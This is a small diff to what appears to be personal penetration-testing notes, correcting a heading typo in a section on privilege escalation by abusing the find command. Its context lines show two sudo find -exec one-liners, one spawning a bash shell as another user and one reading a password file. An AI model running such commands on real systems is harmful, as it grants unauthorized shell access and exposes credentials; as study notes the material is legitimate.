@@ -43,7 +43,7 @@ Poratble Database
 |---| -- |
 |.tables| SELECT * FROM tablename;|
 
-### Privelage Escaltion abusing find command
+### Privelage Escalation abusing find command
 ##### sudo -u user find /etc -name passwd -type f -exec bash \;
 ##### sudo -u user find /usr/bin -name password.txt -type f -exec cat {} \;
 
